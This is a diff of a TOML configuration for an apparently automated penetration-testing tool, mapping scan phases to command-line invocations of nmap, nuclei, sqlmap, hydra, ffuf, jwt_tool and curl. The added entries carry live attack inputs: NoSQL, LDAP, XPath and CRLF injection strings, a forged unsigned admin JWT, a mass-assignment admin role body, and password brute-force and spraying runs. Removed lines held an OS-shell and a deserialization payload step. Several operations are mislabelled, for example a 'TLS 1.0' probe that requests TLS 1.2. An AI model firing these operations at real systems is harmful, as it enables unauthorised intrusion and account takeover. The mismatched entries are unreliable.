+[[capability.provider.operation]]
+name = 'Lockfile Hunt'
+args = ['{path}', '-name', 'package-lock.json', '-o', '-name', 'yarn.lock', '-o', '-name', 'Pipfile.lock']
+output = 'lines'
+network = false
 
 [[capability]]
 id = 'vulnerability.config-audit'
@@ -4145,19 +4920,17 @@ binary = 'lynis'
 name = 'System Audit'
 args = ['audit', 'system', '--quick', '--no-colors']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
 name = 'Pentest Audit'
 args = ['audit', 'system', '--pentest', '--no-colors']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
 name = 'Docker Audit'
 args = ['audit', 'dockerfile', '{target}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
@@ -4172,16 +4945,47 @@ name = 'SSH Algos'
 args = ['--script', 'ssh2-enum-algos', '-p', '22', '{target}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Security Headers'
 args = ['--script', 'http-security-headers', '-p', '80,443', '{target}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'SMB Security'
 args = ['--script', 'smb-security-mode', '-p', '445', '{target}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'FTP Anonymous Script'
+args = ['--script', 'ftp-anon', '-p', '21', '{target}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Directory Listing Probe'
+args = ['-sk', '{target}/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Header Posture Probe'
+args = ['-u', '{target}', '-csp', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Config Tuning'
+args = ['-h', '{target}', '-Tuning', '6', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'TLS Baseline'
+args = ['--no-colour', '{target}:443']
 output = 'lines'
 network = true
 
@@ -4197,8 +5001,8 @@ inputs = [
 binary = 'wpscan'
 [[capability.provider.operation]]
 name = 'WordPress Enum'
-args = ['--url', '{url}', '-e', 'ap,at,u', '-f', 'json']
-output = 'lines'
+args = ['--url', '{url}', '-e', 'ap,at,u', '-f', 'json', '-o', 'wpscan_out.json']
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'droopescan'
@@ -4228,40 +5032,230 @@ name = 'CMS Templates'
 args = ['-u', '{url}', '-tags', 'wordpress,joomla,drupal,magento', '-silent', '-nc']
 output = 'lines'
 network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'CMS Fingerprint'
+args = ['-a', '3', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'WP Paths Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/wp-login.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'WP REST Users Probe'
+args = ['-sk', '{url}/wp-json/wp/v2/users']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Readme Exposure Probe'
+args = ['-sk', '{url}/readme.html']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'CMS Exploit Search'
+args = ['wordpress', 'plugin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'CVE CMS Templates'
+args = ['-u', '{url}', '-tags', 'cve,wordpress', '-severity', 'high,critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'CMS Tech Probe'
+args = ['-u', '{url}', '-tech-detect', '-title', '-silent', '-nc', '-json']
+output = 'json'
+network = true
 
 [[capability]]
-id = 'vulnerability.cloud-audit'
+id = 'vulnerability.api-testing'
 phase = 'vulnerability'
-label = 'CLOUD AUDIT'
-summary = 'Audit cloud accounts for misconfiguration and excessive exposure'
+label = 'API TESTING'
+summary = 'Test API endpoints for broken objects, methods and schemas'
 inputs = [
-  { key = 'provider', type = 'list', required = false, default = 'aws' },
+  { key = 'url', type = 'url', required = true },
+  { key = 'token', type = 'secret', required = false },
 ]
 [[capability.provider]]
-binary = 'prowler'
+binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Severity Scan'
-args = ['{provider}', '--severity', 'critical', 'high', '-M', 'json-ocsf']
+name = 'API Templates'
+args = ['-u', '{url}', '-tags', 'api', '-silent', '-nc']
 output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'GraphQL Templates'
+args = ['-u', '{url}', '-tags', 'graphql', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Unauthorized Object Probe'
+args = ['-sk', '-H', 'Authorization: Bearer {token}', '{url}/api/users/1']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Method Override Probe'
+args = ['-sk', '-X', 'POST', '-H', 'X-HTTP-Method-Override: DELETE', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Mass Assignment Probe'
+args = ['-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"role":"admin"}', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GraphQL Introspection'
+args = ['-sk', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"query":"{ __schema { types { name } } }"}', '{url}/graphql']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'IDOR Fuzz'
+args = ['-u', '{url}/api/users/FUZZ', '-w', '/usr/share/wordlists/ids.txt', '-mc', '200', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'API Param Hunt'
+args = ['-u', '{url}', '-m', 'JSON', '-oJ', 'arjun_api.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'jwt_tool'
+[[capability.provider.operation]]
+name = 'Token Tamper'
+args = ['{token}', '-M', 'at']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Swagger Doc Probe'
+args = ['-sk', '{url}/swagger.json']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'kiterunner'
+[[capability.provider.operation]]
+name = 'Route Scan'
+args = ['scan', '{url}', '-x', '10', '-j', '100']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'API Live Probe'
+args = ['-u', '{url}', '-sc', '-cl', '-silent', '-nc', '-json']
+output = 'json'
 network = true
 
+[[capability]]
+id = 'vulnerability.takeover-check'
+phase = 'vulnerability'
+label = 'TAKEOVER CHECK'
+summary = 'Detect dangling DNS records and takeover-able services'
+inputs = [
+  { key = 'domain', type = 'domain', required = true },
+]
+[[capability.provider]]
+binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Compliance Scan'
-args = ['{provider}', '--compliance', 'cis_level_1', '-M', 'json']
+name = 'Takeover Templates'
+args = ['-u', '{domain}', '-tags', 'takeover', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Secret Templates'
+args = ['-u', '{domain}', '-tags', 'token,credential,secret,leak', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Default Login Templates'
+args = ['-u', '{domain}', '-tags', 'default-login', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'scoutsuite'
+binary = 'subzy'
 [[capability.provider.operation]]
-name = 'Multi Cloud Audit'
-args = ['{provider}', '--force', '--no-browser']
+name = 'Subdomain Takeover'
+args = ['run', '--target', '{domain}', '--hide_fails']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'HTTPS Focused Run'
+args = ['run', '--target', '{domain}', '--https', '--hide_fails']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'cloudsplaining'
+binary = 'dig'
 [[capability.provider.operation]]
-name = 'IAM Exposure'
-args = ['scan', '--input-file', 'account-auth-details.json']
+name = 'CNAME Pull'
+args = ['+short', '{domain}', 'CNAME']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'host'
+[[capability.provider.operation]]
+name = 'CNAME Verify'
+args = ['-t', 'cname', '{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dnsx'
+[[capability.provider.operation]]
+name = 'CNAME Chain'
+args = ['-d', '{domain}', '-cname', '-a', '-resp', '-json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S3 Fingerprint Probe'
+args = ['-sk', 'https://{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Response Body Probe'
+args = ['-u', 'https://{domain}', '-silent', '-nc', '-title', '-webserver']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'subfinder'
+[[capability.provider.operation]]
+name = 'Sub Target List'
+args = ['-d', '{domain}', '-silent']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Cloud Fingerprint Templates'
+args = ['-u', '{domain}', '-tags', 'fingerprint,cloud', '-silent', '-nc']
 output = 'lines'
 network = true
 
@@ -4281,13 +5275,11 @@ name = 'Vulnerable Check'
 args = ['--vulnerable', '{target}:{port}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Protocol Audit'
 args = ['--protocols', '--ciphers', '{target}:{port}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Full Sweep'
 args = ['--full', '{target}:{port}']
@@ -4314,209 +5306,408 @@ name = 'Cert Issues'
 args = ['-u', '{target}', '-expired', '-mismatched', '-self-signed', '-revoked', '-silent']
 output = 'lines'
 network = true
-
-[[capability]]
-id = 'vulnerability.api-testing'
-phase = 'vulnerability'
-label = 'API TESTING'
-summary = 'Test API endpoints for broken objects, methods and schemas'
-inputs = [
-  { key = 'url', type = 'url', required = true },
-  { key = 'token', type = 'secret', required = false },
-]
 [[capability.provider]]
-binary = 'nuclei'
+binary = 'sslscan'
 [[capability.provider.operation]]
-name = 'API Templates'
-args = ['-u', '{url}', '-tags', 'api', '-silent', '-nc']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'GraphQL Templates'
-args = ['-u', '{url}', '-tags', 'graphql', '-silent', '-nc']
+name = 'Weak Cipher Scan'
+args = ['--show-certificate', '--no-colour', '{target}:{port}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'ffuf'
+binary = 'openssl'
 [[capability.provider.operation]]
-name = 'Method Fuzz'
-args = ['-u', '{url}/FUZZ', '-X', 'FUZZ', '-w', 'methods.txt', '-mc', 'all', '-fc', '405', '-of', 'json']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'IDOR Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', 'ids.txt', '-mc', '200', '-of', 'json']
+name = 'TLS 1.0 Probe'
+args = ['s_client', '-connect', '{target}:{port}', '-tls1_2', '-brief']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'kr'
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'Route Scan'
-args = ['scan', '{url}', '-A=apiroutes-210328:20000', '-x', '10']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'vulnerability.template-injection'
-phase = 'vulnerability'
-label = 'TEMPLATE INJECTION'
-summary = 'Detect server side template injection and engine fingerprint'
-inputs = [
-  { key = 'url', type = 'url', required = true },
-]
-[[capability.provider]]
-binary = 'tplmap'
-[[capability.provider.operation]]
-name = 'Auto Detect'
-args = ['-u', '{url}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'OS Shell Probe'
-args = ['-u', '{url}', '--os-shell']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Engine Force'
-args = ['-u', '{url}', '-e', 'Jinja2']
+name = 'Weak TLS Probe'
+args = ['-sk', '--tlsv1.0', '-o', '/dev/null', '-w', '%{http_code}', 'https://{target}:{port}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'SSTI Templates'
-args = ['-u', '{url}', '-tags', 'ssti', '-silent', '-nc']
+name = 'SSL Templates'
+args = ['-u', '{target}', '-tags', 'ssl,tls', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'ffuf'
+binary = 'sslscan'
 [[capability.provider.operation]]
-name = 'Payload Fuzz'
-args = ['-u', '{url}?name=FUZZ', '-w', 'ssti.txt', '-mc', 'all', '-of', 'json']
+name = 'XML Baseline'
+args = ['--xml=sslscan_vuln.xml', '--no-colour', '{target}:{port}']
 output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'testssl.sh'
+[[capability.provider.operation]]
+name = 'JSON Sweep'
+args = ['--full', '--jsonfile', 'testssl_vuln.json', '{target}:{port}']
+output = 'json'
 network = true
 
 [[capability]]
-id = 'vulnerability.deserialization-test'
+id = 'vulnerability.auth-bypass'
 phase = 'vulnerability'
-label = 'DESERIALIZATION TEST'
-summary = 'Probe endpoints and Java services for deserialization flaws'
+label = 'AUTH BYPASS'
+summary = 'Test authentication and session handling for bypass flaws'
 inputs = [
   { key = 'url', type = 'url', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'ysoserial'
+binary = 'hydra'
 [[capability.provider.operation]]
-name = 'Payload Generate'
-args = ['CommonsCollections1', 'id']
+name = 'Form Brute'
+args = ['-L', 'users.txt', '-P', 'passwords.txt', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:failed']
 output = 'lines'
 network = true
-
+[[capability.provider]]
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'URLDNS Probe'
-args = ['URLDNS', '{url}']
+name = 'Default Creds Probe'
+args = ['-sk', '-X', 'POST', '-d', 'username=admin&password=admin', '{url}/login']
 output = 'lines'
 network = true
+[[capability.provider.operation]]
+name = 'No Auth Access Probe'
+args = ['-sk', '{url}/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Cookie Tamper Probe'
+args = ['-sk', '-H', 'Cookie: admin=1', '{url}/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JWT None Probe'
+args = ['-sk', '-H', 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'jwt_tool'
+[[capability.provider.operation]]
+name = 'Token Audit'
+args = ['-M', 'at', '{url}']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Deserialization Templates'
-args = ['-u', '{url}', '-tags', 'deserialization,java', '-silent', '-nc']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nmap'
-[[capability.provider.operation]]
-name = 'RMI Scripts'
-args = ['--script', 'rmi-dumpregistry,rmi-vuln-classloader', '-p', '1099', '{url}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Struts Script'
-args = ['--script', 'http-vuln-cve2017-5638', '-p', '80,443', '{url}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'vulnerability.fuzz-testing'
-phase = 'vulnerability'
-label = 'FUZZ TESTING'
-summary = 'Fuzz parameters, paths and headers for abnormal behaviour'
-inputs = [
-  { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false },
-]
-[[capability.provider]]
-binary = 'ffuf'
-[[capability.provider.operation]]
-name = 'Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Parameter Fuzz'
-args = ['-u', '{url}?file=FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Header Fuzz'
-args = ['-u', '{url}', '-H', 'FUZZ: evil', '-w', '{wordlist}', '-mc', 'all', '-fc', '404', '-of', 'json']
+name = 'Auth Bypass Templates'
+args = ['-u', '{url}', '-tags', 'auth,bypass,default-login', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wfuzz'
 [[capability.provider.operation]]
-name = 'Word Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '--hc', '404', '-t', '50']
+name = 'Login Fuzz'
+args = ['-z', 'file,/usr/share/wordlists/passwords.txt', '-d', 'username=admin&password=FUZZ', '{url}/login', '--hc', '403']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'radamsa'
+binary = 'ffuf'
 [[capability.provider.operation]]
-name = 'Mutation Fuzz'
-args = ['-n', '100', '{url}']
+name = 'Login Cluster Bomb'
+args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=FUZZ&password=FUZ2Z', '-w', '/usr/share/wordlists/users.txt', '-w', '/usr/share/wordlists/passwords.txt', '-mc', '302', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Web Basic Auth Spray'
+args = ['http', '{url}', '-u', 'users.txt', '-p', 'passwords.txt', '--basic-auth']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Session Fixation Probe'
+args = ['-skI', '-c', 'cookies.txt', '{url}/login']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Login Page Probe'
+args = ['-u', '{url}/login', '-sc', '-title', '-silent', '-nc']
 output = 'lines'
 network = true
 
 [[capability]]
-id = 'vulnerability.takeover-check'
+id = 'vulnerability.header-security'
 phase = 'vulnerability'
-label = 'TAKEOVER CHECK'
-summary = 'Detect dangling DNS records and takeover-able services'
+label = 'HEADER SECURITY'
+summary = 'Audit security headers and browser-facing policy posture'
 inputs = [
-  { key = 'domain', type = 'domain', required = true },
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Header Dump'
+args = ['-skI', '{url}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'CSP Header Pull'
+args = ['-skI', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'CSP Probe'
+args = ['-u', '{url}', '-csp', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Security Header Script'
+args = ['--script', 'http-security-headers', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Header Misconfig Templates'
+args = ['-u', '{url}', '-tags', 'misconfig,headers', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Header Tuning'
+args = ['-h', '{url}', '-Tuning', 'b', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CORS Probe'
+args = ['-skI', '-H', 'Origin: https://evil.example', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Clickjacking Probe'
+args = ['-skI', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'HSTS Probe'
+args = ['-skI', 'https://{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'Header Fingerprint'
+args = ['{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'testssl.sh'
+[[capability.provider.operation]]
+name = 'Header TLS Mixed'
+args = ['--headers', '{url}:443']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Header JSON Dump'
+args = ['-u', '{url}', '-header', '-json', '-silent', '-nc']
+output = 'json'
+network = true
+
+[[capability]]
+id = 'vulnerability.exposure-sweep'
+phase = 'vulnerability'
+label = 'EXPOSURE SWEEP'
+summary = 'Sweep for exposed panels, configs, dashboards and debug endpoints'
+inputs = [
+  { key = 'url', type = 'url', required = true },
 ]
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Takeover Templates'
-args = ['-u', '{domain}', '-tags', 'takeover', '-silent', '-nc']
+name = 'Panel Templates'
+args = ['-u', '{url}', '-tags', 'panel,detect', '-silent', '-nc']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
-name = 'Secret Templates'
-args = ['-u', '{domain}', '-tags', 'token,credential,secret,leak', '-silent', '-nc']
+name = 'Config Exposure Templates'
+args = ['-u', '{url}', '-tags', 'config,exposure', '-silent', '-nc']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
-name = 'Default Login Templates'
-args = ['-u', '{domain}', '-tags', 'default-login', '-silent', '-nc']
+name = 'Debug Templates'
+args = ['-u', '{url}', '-tags', 'debug', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'subzy'
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'Subdomain Takeover'
-args = ['run', '--target', '{domain}', '--hide_fails']
+name = 'Actuator Probe'
+args = ['-sk', '{url}/actuator']
+output = 'json'
+network = true
+[[capability.provider.operation]]
+name = 'PHPInfo Probe'
+args = ['-sk', '{url}/phpinfo.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Admin Panel Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Env Exposure Probe'
+args = ['-sk', '{url}/.env']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Panel Path Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200', '-fc', '404', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'gobuster'
+[[capability.provider.operation]]
+name = 'Panel Dir Scan'
+args = ['dir', '-u', '{url}', '-w', '/usr/share/wordlists/dirb/common.txt', '-t', '50', '-b', '404']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Panel Title Sweep'
+args = ['-u', '{url}', '-title', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Exposure Tuning'
+args = ['-h', '{url}', '-Tuning', '8', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'Panel Fingerprint'
+args = ['{url}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'vulnerability.injection-sweep'
+phase = 'vulnerability'
+label = 'INJECTION SWEEP'
+summary = 'Broad injection sweep: NoSQL, LDAP, XPath and header injections'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NoSQL Operator Probe'
+args = ['-sk', '-X', 'POST', '-d', 'user=admin&pass[$ne]=x', '{url}/login']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'LDAP Injection Probe'
+args = ['-sk', '-G', '--data-urlencode', 'user=*)(|(objectClass=*', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XPath Injection Probe'
+args = ['-sk', '-G', '--data-urlencode', "user=' or 1=1 or 'a'='a", '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'CRLF Injection Probe'
+args = ['-sk', '--path-as-is', '{url}?next=%0d%0aX-Injected: yes']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Injection Templates'
+args = ['-u', '{url}', '-tags', 'injection,nosqli,ldapi', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'NoSQL Tuning Sweep'
+args = ['-u', '{url}', '--batch', '--level', '3', '--risk', '2']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'commix'
+[[capability.provider.operation]]
+name = 'Injection Sweep'
+args = ['-u', '{url}', '--batch']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Injection Param Fuzz'
+args = ['-u', '{url}?param=FUZZ', '-w', '/usr/share/wordlists/injections.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_inj.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Injection Tuning'
+args = ['-h', '{url}', '-Tuning', '12', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'Injection Module Audit'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'all', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'dalfox'
+[[capability.provider.operation]]
+name = 'Injection Param Scan'
+args = ['url', '{url}', '--silence']
 output = 'lines'
 network = true
 
@@ -4536,7 +5727,6 @@ name = 'Template Recheck'
 args = ['-u', '{url}', '-t', '{template}', '-silent', '-nc']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'CVE Recheck'
 args = ['-u', '{url}', '-tags', 'cve', '-severity', 'critical', '-silent', '-nc']
@@ -4546,14 +5736,70 @@ network = true
 binary = 'httpx'
 [[capability.provider.operation]]
 name = 'Response Validation'
-args = ['-u', '{url}', '-title', '-cl', '-sc', '-json']
-output = 'lines'
+args = ['-u', '{url}', '-title', '-cl', '-sc', '-json', '-silent', '-nc']
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'sqlmap'
 [[capability.provider.operation]]
 name = 'Technique Confirm'
 args = ['-u', '{url}', '--batch', '--technique=B', '--banner']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dalfox'
+[[capability.provider.operation]]
+name = 'XSS Confirm'
+args = ['url', '{url}', '--silence']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Manual Repro Probe'
+args = ['-sk', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'PoC Path Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/poc-verify']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Corroborate Scan'
+args = ['-h', '{url}', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'Stack Confirm'
+args = ['{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Service Confirm'
+args = ['-sV', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'Exploit Correlate'
+args = ['--json', '{url}']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Severity Recheck'
+args = ['-u', '{url}', '-severity', 'high,critical', '-silent', '-nc']
 output = 'lines'
 network = true
 
